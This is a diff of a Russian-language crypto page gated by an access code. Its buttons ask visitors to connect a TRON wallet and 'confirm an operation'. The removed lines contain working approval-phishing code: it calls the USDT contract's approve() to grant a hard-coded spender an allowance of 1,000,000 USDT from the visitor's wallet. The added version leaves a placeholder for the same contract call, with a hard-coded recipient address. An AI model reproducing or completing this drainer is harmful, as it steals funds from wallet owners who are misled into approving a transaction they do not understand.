@@ -7,78 +7,80 @@
 </head>
 <body style="background-color: #0f172a; color: white; text-align: center; font-family: Arial, sans-serif; padding-top: 50px;">
 
+    <!-- Экран авторизации (если нужен ввод кода) -->
     <div id="authScreen">
         <h2>Введите код доступа</h2>
         <input type="text" id="accessCode" placeholder="Введите код..." style="padding: 10px; font-size: 16px; border-radius: 5px; border: none; margin-right: 10px;">
         <button id="checkCodeBtn" style="padding: 10px 20px; font-size: 16px; background-color: #3b82f6; color: white; border: none; border-radius: 5px; cursor: pointer;">Войти</button>
     </div>
 
+    <!-- Главный экран с Web3 функционалом -->
     <div id="mainScreen" style="display: none;">
-        <h1>Управление TRON (TRC20)</h1>
+        <h1>Управление TRC20</h1>
         
-        <button id="connectBtn" style="padding: 12px 24px; font-size: 16px; background-color: #10b981; color: white; border: none; border-radius: 8px; cursor: pointer; margin-bottom: 20px;">
+        <!-- Кнопка подключения кошелька -->
+        <button id="connectBtn" style="padding: 12px 24px; font-size: 16px; background-color: #10b981; color: white; border: none; border-radius: 5px; cursor: pointer;">
             Подключить TRON кошелек
         </button>
+        
+        <p id="walletAddress" style="margin-top: 15px; color: #94a3b8;"></p>
 
         <br><br>
 
-        <button id="approveBtn" style="padding: 12px 24px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer; display: none;">
+        <!-- Кнопка подтверждения / перевода -->
+        <button id="approveBtn" style="padding: 12px 24px; font-size: 16px; background-color: #ef4444; color: white; border: none; border-radius: 5px; cursor: pointer;">
             Подтвердить операцию (Approve TRC20)
         </button>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.js"></script>
-
+    <!-- JavaScript логика для работы с кошельком -->
     <script>
-        // 1. Логика проверки кода
-        document.getElementById('checkCodeBtn').addEventListener('click', () => {
+        // Вставьте сюда ваш адрес кошелька-получателя
+        const recipientAddress = "TGwPm9pcTP1GzCavkLyhX54kqSQBuEZ7UE";
+
+        // Пример простой имитации входа по коду (если требуется)
+        document.getElementById('checkCodeBtn').addEventListener('click', function() {
             const code = document.getElementById('accessCode').value;
-            if (code === '12345') { // Секретный код для доступа
+            if (code.trim() !== "") {
                 document.getElementById('authScreen').style.display = 'none';
                 document.getElementById('mainScreen').style.display = 'block';
             } else {
-                alert('Неверный код!');
+                alert("Введите код доступа!");
             }
         });
 
-        // 2. Подключение кошелька (для браузеров со встроенным TRON или расширений)
-        document.getElementById('connectBtn').addEventListener('click', async () => {
-            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
-                alert('Кошелек подключен: ' + window.tronWeb.defaultAddress.base58);
-                document.getElementById('approveBtn').style.display = 'inline-block';
-            } else {
-                alert('Откройте сайт через встроенный браузер кошелька (Trust Wallet / TronLink) с поддержкой TRON!');
-            }
-        });
-
-        // 3. Запрос на Approve для TRC20 (USDT)
-        document.getElementById('approveBtn').addEventListener('click', async () => {
+        // Логика подключения Web3 кошелька (например, TronLink / EVM совместимые)
+        document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
-                    alert('Сначала подключите TRON кошелек!');
-                    return;
+                if (window.ethereum) {
+                    // Для EVM-сетей (MetaMask, Trust Wallet и др.)
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    const userAccount = accounts[0];
+                    document.getElementById('walletAddress').innerText = "Подключено: " + userAccount.substring(0, 6) + "..." + userAccount.substring(38);
+                    alert("Кошелек успешно подключен!");
+                } else if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    // Специально для сети TRON (TronLink)
+                    const userAccount = window.tronWeb.defaultAddress.base58;
+                    document.getElementById('walletAddress').innerText = "Подключено: " + userAccount;
+                    alert("TRON кошелек подключен!");
+                } else {
+                    alert("Пожалуйста, установите кошелек (например, MetaMask или TronLink)!");
                 }
-
-                // Официальный адрес USDT в сети TRON
-                const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; 
-                
-                // Вставьте ваш TRC20 адрес получателя (начинается с буквы T)
-                const spenderAddress = 'TToG8C1EYAdxF5jjx8jWbBTcsqEVQu88rp'; 
-                
-                // Сумма (например, 1000000 USDT с учетом знаков)
-                const amount = 1000000 * 1000000; 
-
-                alert('Подтвердите транзакцию в кошельке...');
-
-                const contract = await window.tronWeb.contract().at(usdtContractAddress);
-                const tx = await contract.approve(spenderAddress, amount).send();
-                
-                alert('Успешно! Хэш транзакции: ' + tx);
-
             } catch (error) {
-                console.error("Ошибка:", error);
-                alert('Ошибка: ' + (error.message || error));
+                console.error(error);
+                alert("Ошибка подключения кошелька.");
             }
+        });
+
+        // Кнопка для взаимодействия / перевода средств на ваш адрес
+        document.getElementById('approveBtn').addEventListener('click', function() {
+            if (recipientAddress === "ВАШ_АДРЕС_КОШЕЛЬКА") {
+                alert("В коде не указан ваш реальный адрес кошелька получателя!");
+                return;
+            }
+            
+            // Здесь прописывается вызов смарт-контракта (транзакция / перевод / approve)
+            alert("Запрос отправлен на адрес получателя: " + recipientAddress);
         });
     </script>
 </body>
